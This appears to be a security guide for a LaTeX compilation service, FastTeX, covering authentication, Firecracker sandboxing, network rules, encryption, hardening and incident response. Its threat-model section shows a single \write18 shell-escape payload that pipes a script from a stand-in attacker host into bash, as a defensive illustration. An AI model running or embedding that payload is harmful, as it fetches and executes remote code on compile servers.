# FastTeX Security Guide

> Comprehensive security documentation for FastTeX deployment and operations.

## Table of Contents

1. [Security Architecture](#security-architecture)
2. [Authentication & Authorization](#authentication--authorization)
3. [Worker Sandboxing](#worker-sandboxing)
4. [Network Security](#network-security)
5. [Data Protection](#data-protection)
6. [Security Hardening](#security-hardening)
7. [Incident Response](#incident-response)
8. [Compliance](#compliance)

---

## Security Architecture

### Defense in Depth

FastTeX employs multiple layers of security:

```
┌─────────────────────────────────────────────────────────────┐
│                    Layer 1: Edge Security                    │
│              (WAF, DDoS Protection, Rate Limiting)          │
└─────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────┐
│                 Layer 2: Authentication                      │
│              (JWT, MFA, Session Management)                  │
└─────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────┐
│                  Layer 3: Authorization                      │
│              (RBAC, Project Permissions)                     │
└─────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────┐
│                 Layer 4: Application                         │
│            (Input Validation, CSRF Protection)               │
└─────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────┐
│                  Layer 5: Sandboxing                         │
│              (Firecracker microVMs)                          │
└─────────────────────────────────────────────────────────────┘
                              │
┌─────────────────────────────────────────────────────────────┐
│                 Layer 6: Data Protection                     │
│            (Encryption at Rest & in Transit)                 │
└─────────────────────────────────────────────────────────────┘
```

### Security Principles

1. **Zero Trust**: Never trust, always verify
2. **Least Privilege**: Minimal necessary permissions
3. **Defense in Depth**: Multiple security layers
4. **Secure by Default**: Security built-in, not bolt-on
5. **Fail Secure**: Errors don't expose vulnerabilities

---

## Authentication & Authorization

### JWT Token Security

**Token Configuration:**
```toml
[auth]
# Use strong secrets (256+ bits)
jwt_secret = "<generated-256-bit-secret>"

# Short-lived access tokens
access_token_expiry_minutes = 15

# Longer refresh tokens
refresh_token_expiry_days = 7

# Algorithm
jwt_algorithm = "HS256"  # or RS256 for asymmetric
```

**Token Structure:**
```json
{
  "header": {
    "alg": "HS256",
    "typ": "JWT"
  },
  "payload": {
    "sub": "user-uuid",
    "email": "user@example.com",
    "role": "user",
    "iat": 1705330800,
    "exp": 1705331700,
    "jti": "unique-token-id"
  }
}
```

### Password Security

**Requirements:**
- Minimum 12 characters
- Must include: uppercase, lowercase, number, special character
- Cannot match common passwords (top 10,000 list)
- Cannot contain user's email or name

**Hashing:**
```rust
// Using Argon2id (winner of Password Hashing Competition)
use argon2::{Argon2, PasswordHasher, PasswordVerifier};
use argon2::password_hash::SaltString;

pub fn hash_password(password: &str) -> Result<String, Error> {
    let salt = SaltString::generate(&mut OsRng);
    let argon2 = Argon2::default();
    let hash = argon2.hash_password(password.as_bytes(), &salt)?;
    Ok(hash.to_string())
}

pub fn verify_password(password: &str, hash: &str) -> bool {
    let parsed_hash = PasswordHash::new(hash).unwrap();
    Argon2::default()
        .verify_password(password.as_bytes(), &parsed_hash)
        .is_ok()
}
```

### Multi-Factor Authentication (MFA)

**Supported Methods:**
- TOTP (Time-based One-Time Password)
- WebAuthn/FIDO2 (Hardware keys)
- Email verification codes

**TOTP Setup:**
```rust
use totp_rs::{Algorithm, TOTP};

pub fn generate_totp_secret() -> String {
    // Generate 160-bit secret
    let secret = rand::thread_rng()
        .sample_iter(&Alphanumeric)
        .take(20)
        .collect::<String>();
    
    base32::encode(Alphabet::RFC4648 { padding: false }, secret.as_bytes())
}

pub fn verify_totp(secret: &str, code: &str) -> bool {
    let totp = TOTP::new(
        Algorithm::SHA1,
        6,      // digits
        1,      // skew (±1 period)
        30,     // period
        secret.as_bytes().to_vec(),
    ).unwrap();
    
    totp.check_current(code).unwrap()
}
```

### Role-Based Access Control (RBAC)

**Roles:**
| Role | Description | Permissions |
|------|-------------|-------------|
| `viewer` | Read-only access | View files, download PDF |
| `editor` | Edit access | All viewer + edit files, compile |
| `admin` | Project admin | All editor + manage collaborators, settings |
| `owner` | Project owner | All admin + delete project, transfer ownership |

**Permission Matrix:**
| Action | Viewer | Editor | Admin | Owner |
|--------|--------|--------|-------|-------|
| View files | ✓ | ✓ | ✓ | ✓ |
| Download PDF | ✓ | ✓ | ✓ | ✓ |
| Edit files | | ✓ | ✓ | ✓ |
| Compile | | ✓ | ✓ | ✓ |
| Manage collaborators | | | ✓ | ✓ |
| Change settings | | | ✓ | ✓ |
| Delete project | | | | ✓ |

---

## Worker Sandboxing

### Why Firecracker?

**Threat Model:**
LaTeX's `\write18` shell escape allows arbitrary command execution. Without sandboxing:
```latex
\immediate\write18{curl attacker.com/malware | bash}
```

**Comparison:**

| Feature | Firecracker | Docker | gVisor |
|---------|-------------|--------|--------|
| Isolation | Hardware (KVM) | Namespaces | Syscall filtering |
| Startup time | ~125ms | ~1s | ~500ms |
| Attack surface | ~50k LoC | ~500k LoC | ~100k LoC |
| Container escape risk | Very low | Moderate | Low |
| Performance | Near-native | Native | 10-20% overhead |

### Firecracker Configuration

**Secure VM Template:**
```json
{
  "boot-source": {
    "kernel_image_path": "/srv/fasttex/vmlinux",
    "boot_args": "console=ttyS0 reboot=k panic=1 pci=off"
  },
  "machine-config": {
    "vcpu_count": 1,
    "mem_size_mib": 512,
    "smt": false
  },
  "drives": [
    {
      "drive_id": "rootfs",
      "path_on_host": "/srv/fasttex/rootfs.ext4",
      "is_root_device": true,
      "is_read_only": true
    },
    {
      "drive_id": "work",
      "path_on_host": "/tmp/work-{job_id}.ext4",
      "is_root_device": false,
      "is_read_only": false
    }
  ],
  "network-interfaces": [],
  "vsock": null
}
```

**Security Properties:**
1. **No network**: Workers have zero network access
2. **Read-only rootfs**: Base system cannot be modified
3. **Ephemeral**: VMs destroyed after each job
4. **Resource caps**: Strictly limited CPU/memory
5. **No device access**: Only virtualized storage

### Rootfs Security

**Minimal rootfs contents:**
```
/
├── bin/          # BusyBox utilities only
├── lib/          # Minimal libc
├── usr/
│   └── bin/
│       └── tectonic  # TeX compiler only
├── etc/
│   └── passwd    # Single user
└── var/
    └── work/     # Working directory
```

**Build script:**
```bash
#!/bin/bash
# build-rootfs.sh

set -euo pipefail

ROOTFS_DIR=$(mktemp -d)
ROOTFS_SIZE_MB=256

# Create minimal filesystem
mkdir -p ${ROOTFS_DIR}/{bin,lib,usr/bin,etc,var/work}

# Copy BusyBox (statically linked)
cp /usr/bin/busybox ${ROOTFS_DIR}/bin/
ln -s busybox ${ROOTFS_DIR}/bin/sh

# Copy Tectonic (statically linked)
cp /usr/local/bin/tectonic ${ROOTFS_DIR}/usr/bin/

# Minimal /etc
cat > ${ROOTFS_DIR}/etc/passwd << EOF
root:x:0:0:root:/:/bin/sh
worker:x:1000:1000:worker:/var/work:/bin/sh
EOF

# Create ext4 image
dd if=/dev/zero of=rootfs.ext4 bs=1M count=${ROOTFS_SIZE_MB}
mkfs.ext4 rootfs.ext4
MOUNT_DIR=$(mktemp -d)
mount rootfs.ext4 ${MOUNT_DIR}
cp -r ${ROOTFS_DIR}/* ${MOUNT_DIR}/
umount ${MOUNT_DIR}

# Make read-only
e2fsck -f rootfs.ext4
tune2fs -O ^has_journal rootfs.ext4
```

### Shell Escape Prevention

Even with sandboxing, we disable shell escape:

```rust
// In worker compile function
pub fn compile_securely(options: &CompileOptions) -> Result<CompileResult, Error> {
    // Create minimal environment
    let mut env = HashMap::new();
    env.insert("HOME", "/var/work");
    env.insert("PATH", "/usr/bin");
    
    // Remove shell escape capability
    // Tectonic doesn't support \write18 by default, but we ensure it
    env.insert("TEXMF_OUTPUT_DIRECTORY", "/var/work/output");
    
    // Run Tectonic with restricted options
    Command::new("/usr/bin/tectonic")
        .args(&[
            "--untrusted",        // Disable shell escape
            "-o", "/var/work/output",
            &options.input_path,
        ])
        .envs(&env)
        .current_dir("/var/work")
        .output()
}
```

---

## Network Security

### TLS Configuration

**Nginx TLS Settings:**
```nginx
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384;
ssl_prefer_server_ciphers off;
ssl_session_timeout 1d;
ssl_session_cache shared:SSL:50m;
ssl_session_tickets off;
ssl_stapling on;
ssl_stapling_verify on;

# HSTS (2 years)
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
```

### Firewall Rules

```bash
# iptables configuration

# Default policies
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow SSH (restrict to management IPs)
iptables -A INPUT -p tcp --dport 22 -s MANAGEMENT_IP -j ACCEPT

# Allow HTTP/HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Allow health checks from load balancer
iptables -A INPUT -p tcp --dport 8080 -s LB_IP -j ACCEPT
iptables -A INPUT -p tcp --dport 8081 -s LB_IP -j ACCEPT

# Log and drop everything else
iptables -A INPUT -j LOG --log-prefix "DROPPED: "
iptables -A INPUT -j DROP
```

### Internal Network Segmentation

```
┌─────────────────────────────────────────────────────────────┐
│                    Public Network (DMZ)                      │
│                     ┌───────────────┐                        │
│                     │ Load Balancer │                        │
│                     └───────────────┘                        │
└─────────────────────────────┬───────────────────────────────┘
                              │ HTTPS only
┌─────────────────────────────┴───────────────────────────────┐
│                    Application Network                       │
│  ┌─────────┐ ┌─────────────┐ ┌─────────────────┐           │
│  │ Gateway │ │ Orchestrator│ │ Project Service │           │
│  └─────────┘ └─────────────┘ └─────────────────┘           │
└─────────────────────────────┬───────────────────────────────┘
                              │ Internal only
┌─────────────────────────────┴───────────────────────────────┐
│                      Data Network                            │
│       ┌─────────────┐    ┌─────────┐    ┌─────────┐        │
│       │ PostgreSQL  │    │  Redis  │    │   S3    │        │
│       └─────────────┘    └─────────┘    └─────────┘        │
└─────────────────────────────────────────────────────────────┘
                              │ No external access
┌─────────────────────────────┴───────────────────────────────┐
│                    Worker Network (Isolated)                 │
│  ┌──────┐ ┌──────┐ ┌──────┐ ┌──────┐                       │
│  │ VM 1 │ │ VM 2 │ │ VM 3 │ │ VM N │  (No network)        │
│  └──────┘ └──────┘ └──────┘ └──────┘                       │
└─────────────────────────────────────────────────────────────┘
```

---

## Data Protection

### Encryption at Rest

**Database:**
```sql
-- PostgreSQL: Transparent Data Encryption
-- Configure in postgresql.conf:
-- shared_preload_libraries = 'pg_tde'

-- Encrypt sensitive columns
CREATE EXTENSION pgcrypto;

ALTER TABLE users 
ADD COLUMN email_encrypted BYTEA;

UPDATE users 
SET email_encrypted = pgp_sym_encrypt(email, 'encryption-key');
```

**File Storage:**
```rust
// S3 server-side encryption
use aws_sdk_s3::types::ServerSideEncryption;

async fn upload_encrypted(client: &Client, bucket: &str, key: &str, data: &[u8]) -> Result<()> {
    client.put_object()
        .bucket(bucket)
        .key(key)
        .body(ByteStream::from(data.to_vec()))
        .server_side_encryption(ServerSideEncryption::Aes256)
        .send()
        .await?;
    Ok(())
}
```

### Encryption in Transit

All internal communication uses mTLS:

```rust
// mTLS configuration for internal services
use rustls::Certificate;
use rustls::PrivateKey;

fn create_tls_config() -> ServerConfig {
    let certs = load_certs("server.crt");
    let key = load_key("server.key");
    let client_ca = load_certs("ca.crt");
    
    let mut root_store = RootCertStore::empty();
    for cert in client_ca {
        root_store.add(&cert).unwrap();
    }
    
    ServerConfig::builder()
        .with_safe_defaults()
        .with_client_cert_verifier(AllowAnyAuthenticatedClient::new(root_store))
        .with_single_cert(certs, key)
        .unwrap()
}
```

### Secrets Management

**Using HashiCorp Vault:**
```rust
use vaultrs::client::VaultClient;

async fn get_database_url() -> Result<String, Error> {
    let client = VaultClient::new(
        VaultClientSettingsBuilder::default()
            .address("https://vault.internal:8200")
            .token(env::var("VAULT_TOKEN")?)
            .build()?
    )?;
    
    let secret: SecretData = kv2::read(&client, "secret", "fasttex/database").await?;
    Ok(secret.data["url"].as_str().unwrap().to_string())
}
```

---

## Security Hardening

### System Hardening

```bash
#!/bin/bash
# harden-system.sh

# Disable unnecessary services
systemctl disable avahi-daemon bluetooth cups

# Kernel hardening
cat >> /etc/sysctl.conf << EOF
# Disable IP forwarding
net.ipv4.ip_forward = 0

# Enable SYN flood protection
net.ipv4.tcp_syncookies = 1

# Disable ICMP redirects
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.default.accept_redirects = 0

# Enable address space layout randomization
kernel.randomize_va_space = 2

# Restrict dmesg
kernel.dmesg_restrict = 1

# Restrict ptrace
kernel.yama.ptrace_scope = 1
EOF
sysctl -p

# Remove unnecessary packages
apt purge -y telnet rsh-client

# Set secure permissions
chmod 700 /root
chmod 600 /etc/shadow
chmod 644 /etc/passwd

# Configure SSH
cat >> /etc/ssh/sshd_config << EOF
PermitRootLogin no
PasswordAuthentication no
X11Forwarding no
AllowTcpForwarding no
MaxAuthTries 3
EOF
systemctl restart sshd
```

### Application Security

**Input Validation:**
```rust
use validator::Validate;

#[derive(Debug, Validate, Deserialize)]
pub struct CreateProjectRequest {
    #[validate(length(min = 1, max = 100))]
    pub name: String,
    
    #[validate(length(max = 1000))]
    pub description: Option<String>,
    
    #[validate(regex(path = "SAFE_FILENAME_REGEX"))]
    pub main_file: Option<String>,
}

lazy_static! {
    static ref SAFE_FILENAME_REGEX: Regex = Regex::new(r"^[a-zA-Z0-9_\-\.]+\.tex$").unwrap();
}
```

**CSRF Protection:**
```rust
use axum_csrf::CsrfLayer;

let app = Router::new()
    .route("/api/projects", post(create_project))
    .layer(CsrfLayer::new(
        CsrfConfig::default()
            .with_cookie_name("csrf_token")
            .with_cookie_same_site(SameSite::Strict)
    ));
```

**Rate Limiting:**
```rust
use tower_governor::{GovernorLayer, GovernorConfigBuilder};

let governor_conf = GovernorConfigBuilder::default()
    .per_second(2)
    .burst_size(30)
    .finish()
    .unwrap();

let app = Router::new()
    .route("/api/auth/login", post(login))
    .layer(GovernorLayer {
        config: &governor_conf,
    });
```

---

## Incident Response

### Security Monitoring

**Alerting Rules:**
```yaml
# prometheus/alerts.yml
groups:
  - name: security
    rules:
      - alert: HighFailedLogins
        expr: rate(fasttex_auth_failures_total[5m]) > 10
        for: 1m
        labels:
          severity: warning
        annotations:
          summary: "High rate of failed logins"
          
      - alert: SuspiciousCompileActivity
        expr: rate(fasttex_compile_requests_total{status="error"}[5m]) > 50
        for: 5m
        labels:
          severity: critical
        annotations:
          summary: "Unusual compile error rate"
          
      - alert: UnauthorizedAccessAttempt
        expr: increase(fasttex_auth_forbidden_total[1m]) > 5
        for: 1m
        labels:
          severity: critical
        annotations:
          summary: "Multiple unauthorized access attempts"
```

### Incident Response Procedures

**Severity Levels:**
| Level | Description | Response Time | Example |
|-------|-------------|---------------|---------|
| P1 | Critical | < 15 min | Data breach, system compromise |
| P2 | High | < 1 hour | Authentication bypass, DoS |
| P3 | Medium | < 4 hours | Vulnerability discovered |
| P4 | Low | < 24 hours | Security recommendation |

**Response Steps:**
1. **Detect**: Automated alerting or manual report
2. **Contain**: Isolate affected systems
3. **Eradicate**: Remove threat
4. **Recover**: Restore normal operations
5. **Lessons Learned**: Post-incident review

### Audit Logging

```rust
#[derive(Serialize)]
pub struct AuditLog {
    timestamp: DateTime<Utc>,
    user_id: Option<Uuid>,
    action: String,
    resource_type: String,
    resource_id: Option<String>,
    ip_address: String,
    user_agent: String,
    outcome: AuditOutcome,
    details: serde_json::Value,
}

#[derive(Serialize)]
pub enum AuditOutcome {
    Success,
    Failure,
    Denied,
}

// Log security events
pub async fn audit_log(event: AuditLog) {
    // Write to secure audit log
    tracing::info!(
        target: "audit",
        user_id = ?event.user_id,
        action = %event.action,
        resource = %event.resource_type,
        outcome = ?event.outcome,
        "Security audit event"
    );
    
    // Store in database
    sqlx::query!(
        "INSERT INTO audit_logs (timestamp, user_id, action, resource_type, resource_id, ip_address, user_agent, outcome, details) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)",
        event.timestamp,
        event.user_id,
        event.action,
        event.resource_type,
        event.resource_id,
        event.ip_address,
        event.user_agent,
        event.outcome as _,
        event.details
    )
    .execute(&pool)
    .await
    .unwrap();
}
```

---

## Compliance

### GDPR Compliance

**Data Subject Rights:**
- Right to access (export user data)
- Right to rectification (update user data)
- Right to erasure (delete account)
- Right to data portability

**Implementation:**
```rust
// Export user data
pub async fn export_user_data(user_id: Uuid) -> Result<UserDataExport, Error> {
    let user = get_user(user_id).await?;
    let projects = get_user_projects(user_id).await?;
    let audit_logs = get_user_audit_logs(user_id).await?;
    
    Ok(UserDataExport {
        user,
        projects,
        audit_logs,
        exported_at: Utc::now(),
    })
}

// Delete user data
pub async fn delete_user_data(user_id: Uuid) -> Result<(), Error> {
    // Delete in correct order for foreign keys
    delete_user_audit_logs(user_id).await?;
    delete_user_files(user_id).await?;
    delete_user_projects(user_id).await?;
    delete_user(user_id).await?;
    
    // Log deletion (anonymized)
    audit_log(AuditLog {
        user_id: None,
        action: "user_data_deleted".to_string(),
        details: json!({"anonymized_id": hash_uuid(user_id)}),
        ..Default::default()
    }).await;
    
    Ok(())
}
```

### SOC 2 Controls

**Access Controls:**
- MFA required for all admin accounts
- Quarterly access reviews
- Automated de-provisioning

**Change Management:**
- All changes via pull requests
- Required code review
- Automated testing before deploy

**Monitoring:**
- 24/7 alerting
- Log retention: 1 year
- Incident response SLA

---

## Security Checklist

### Pre-Deployment

- [ ] All secrets in Vault/secrets manager
- [ ] TLS certificates configured
- [ ] Firewall rules applied
- [ ] Database encryption enabled
- [ ] Backup encryption enabled
- [ ] MFA configured for admin accounts

### Post-Deployment

- [ ] Penetration test completed
- [ ] Security scan passed
- [ ] Audit logging verified
- [ ] Alerting tested
- [ ] Incident response plan documented

### Ongoing

- [ ] Weekly security patch review
- [ ] Monthly access review
- [ ] Quarterly penetration test
- [ ] Annual security audit
